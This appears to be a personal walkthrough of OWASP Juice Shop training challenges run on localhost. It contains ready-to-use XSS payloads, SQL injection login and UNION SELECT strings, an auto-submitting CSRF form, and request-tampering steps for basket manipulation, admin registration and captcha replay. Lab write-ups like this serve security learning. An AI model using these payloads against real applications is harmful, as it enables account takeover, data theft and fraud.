# LEVEL - 1

## Score Board

Just go to `/#/score-board` part of the setup instructions

## Bully Chatbot

This one seems to be broken for me. I made 10 req/sec but still no reply from bot. No reply even when sending regular requests. The intended sollution is to just send the same message 5 times.

## Error Handling

I logged out and went to the profile page, and tried editing it. Gave an error

## Privacy Policy

Just quickly accept the privacy policy

## Exposed Metrics

Links to a monitering system. Reading docs says usually at `/metrics`

Go to the page, and it is unprotected.

## Outdated Whitelist

TODO

## Missing Encoding

Photo wall page requests a page with a cat emoji `😼` Just encode it.

`http://localhost:3000//assets/public/images/uploads/%F0%9F%98%BC-#zatschi-#whoneedsfourlegs-1572600969477.jpg`

## Confidential Document

`robots.txt` shows `/ftp` which is used to serve files. Got to `/ftp` and dowload `Planned Acquisitions` which seemed like a confedintial file to me

## DOM XXS

Put this in the search bar: `<iframe src="javascript:alert(`xss`)">`

## Mass Dispel

I used some js to fake click the close buttons by id. Didnt work. 

I just had to shift click one of them, closes all.

## Repetitive Registration

DRY = Don't repeat yourself. Aim is to make an account with different pass and confirm pass.

1. Make account, capture request
2. Edit confirm pass in the request and username, make the request

## Zero-Stars

Same as last one, capture request, edit and send.


# Level 2

## XSS Reflected

Go to track orders option

    <iframe src="javascript:alert(`xss`)">

# LEVEL - 2

## Login Admin Injection

Put `' 1=1` in username when loggin in.

## Security Policy

Go to /.well-known/security.txt 

No Idea, what this was. Had to look it up


## Admin Section 

Just go to `http://localhost:3000/#/administration`


## View basket

Make 2 accounts. Capture requests while opening the basket page. 

Its calling `/rest/basket/4`, change it to `/rest/basket/5` and send request

## Deprecated Interface

`main.js` lets us upload more than just zip file, we can also upload xml file. 

## Password Strength

Password is `admin123`, I was testing the interractive hacking button. It told me the pass. Can easily be bruteforced

## Login MC SafeSearch

It was marked OSINT, so I searched `MC SafeSearch` and found this

> username - mc.safesearch@juice-sh.op
> password - Mr. N00dles


## Weird Crypto

TODO

## Five-Star Feedback

Login as admin, go to administration page, remove all 5 star reviews.

# LEVEL - 3

## Client-side XSS Protection

Made this request with postman because there is client side xss protection

`{"email": "<iframe src=\"javascript:alert(``xss``)\">", "password": "lol"}` 

Will appear on the admin page

## CSRF

I live CSRF. We are making the same request username change makes.

Unfortunately this one did not work for me.

```html
<html>

<form action="http://127.0.0.1:3000/profile" method="POST">
        <input name="username" value="IAMDUMB"/>
        <input type="submit"/>
</form>

<script>document.forms[0].submit();</script>
</html>  
```

## API-only XSS

Not avalable on docker. Here is how ir would be done

(Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> without using the frontend application at all.)

1. g in to the application with any user.
2. Copy your `Authorization` header from any HTTP request submitted via browser.
3. Submit a POST request to [http://localhost:3000/api/Products](http://localhost:3000/api/Products) with
    - `{"name": "XSS", "description": "<iframe src=\"javascript:alert(`xss`)\">", "price": 47.11}` as body,
    - `application/json` as `Content-Type`
    - and `Bearer ?` as `Authorization` header, replacing the `?` with the token you copied from the browser.


## Forged Feedback

When we make a feedback, this data is sent to http://localhost:3000/api/Feedbacks/

`{"UserId":6,"captchaId":16,"captcha":"51","comment":"testing,"rating":1}`

I edited the user id and made a request

`{"UserId":5,"captchaId":16,"captcha":"51","comment":"testing,"rating":1}`

## Forged Review

Same as last one, but replace email id instead of user id.

## Admin Registration

We have to make a request with the following data

`{"username": "NEWADMIN", "email":"aa@aa.coam","password":"admin", "role":"admin"}`

## Bjoern's Favorite Pet

Skipping

## Manipulate Basket

A lot of these are just making a request yourself, editing it, and sending it.

This time we use this endpoint: http://localhost:3000/api/BasketItems/

{"ProductId":4,"BasketId":"4","quantity":1}  

to

{"ProductId":4,"BasketId":"5","quantity":1}  

This results in error: invalid BucketId

Trick is to add a decond Baskit id. I guess only the first one is checked for validity, but is added in both

"ProductId":4,"BasketId":"4","quantity":1,"BasketId":"5"} 

and here you win.

## Deluxe Fraud

First enable the pay button by editing the html, and capture the request made.

Remove the "paymentMode" in the data.

## Payback Time

Again, make request, capture, change quantity to high negetive number. ez

## Privacy Policy Inspection

Read the entire fucking Pricay Policy, found nothing, had to look it up: 

1. Open [http://localhost:3000/#/privacy-security/privacy-policy](http://localhost:3000/#/privacy-security/privacy-policy).
2. Moving your mouse cursor over each paragraph will make a fire-effect appear on certain words or partial sentences.
3. spect the HTML in your browser and note down all text inside `<span class="hot">` tags, which are `http://localhost`, `We may also`, `instruct you`, `to refuse all`, `reasonably necessary` and `responsibility`.
4. Combine those into the URL [http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility](http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility) (adding the server port if needed) and solve the challenge by visiting it.

It seems the Juice Shop team did not appreciate your extensive reading effort enough to provide even a tiny gratification, as you will receive only a `404 Error: ENOENT: no such file or directory, stat '/app/frontend/dist/frontend/assets/private/thank-you.jpg'`.

## CAPTCHA Bypass

Feedback requests contains a captcha id and captcha, so we can just repeat this request 10 times because answer is same for the capcha id every time.


## Product Tampering

XSS injection in request: `{"description":"<a href=\"[https://owasp.slack.com](https://owasp.slack.com/)\" target=\"_blank\">More...</a>"}`


## Login Jim

Log in with Jim's user account.

- Log in with *Email* `jim@juice-sh.op'--` and any *Password* if you already know the email address of Jim.
- or log in with *Email* `jim@juice-sh.op` and *Password* `ncc-1701` if you looked up Jim's password hash in a rainbow table after harvesting the user data as described in [Retrieve a list of all user credentials via SQL Injection](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#retrieve-a-list-of-all-user-credentials-via-sql-injection).

## Upload Size

Client doesnt allow files larget than 100kb, but server allows 200kb. Just copy and replace the request


## Login Bender

Use this as email: `bender@juice-sh.op'--`

Why is this level 3?

## Upload a file that has no .pdf or .zip extension

Same as last one, but upload xml file.

## Database Schema

Make this GET request

`http://localhost:3000/rest/products/search?q=a')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master;--`

## GDPR Data Erasure

Also could not do this:

- Log in with *Email* `chris.pike@juice-sh.op'--` and any *Password* if you already know the email address of Chris.
- or log in with *Email* as `\' or deletedAt IS NOT NULL--` and any *Password* you like for a "lucky hit" as Chris seems to be the only or at least first ever deleted user. The presence of `deletedAt` you might have derived from [Retrieve a list of all user credentials via SQL Injection](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#retrieve-a-list-of-all-user-credentials-via-sql-injection) and enforcing it to be `NOT NULL` will give you back only users who were soft-deleted at some point of time.
